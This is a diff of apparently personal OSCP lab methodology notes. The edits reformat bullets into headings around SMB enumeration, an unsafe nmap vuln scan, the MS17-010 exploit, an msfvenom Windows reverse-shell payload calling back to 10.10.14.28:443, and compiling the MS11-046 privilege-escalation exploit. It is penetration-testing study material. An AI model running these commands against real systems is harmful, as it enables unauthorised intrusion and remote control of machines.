@@ -32,7 +32,7 @@ OSCP Methodology
   * OS of machine
 
 * service (OS samba or nmap service header (139 & 445)) -> exploit
-* nmap -sV -sC --open -T4  -p 139,445 --script=vuln --script-args=unsafe=1 <ip>
+##### nmap -sV -sC --open -T4  -p 139,445 --script=vuln --script-args=unsafe=1 <ip>
 * enum4linux
 * smbclient
  
@@ -66,7 +66,7 @@ git clone https://github.com/worawit/MS17-010.git
    service_exec(conn, r'cmd /c c:\\puckieshell443.exe')
  
 * custom payload:
-  * msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.28 LPORT=443 -f exe > shell.exe
+  ##### msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.28 LPORT=443 -f exe > shell.exe
 
 * Needs Listener
 
@@ -81,7 +81,9 @@ git clone https://github.com/worawit/MS17-010.git
 
 * use the https://www.exploit-db.com/exploits/40564
 * compile:
-  * i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32 (apt install mingw-w64)
+  ##### i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32 
+  
+  ###### Installation: apt install mingw-w64
 * no need listener (insta run)
 
 ### Windows
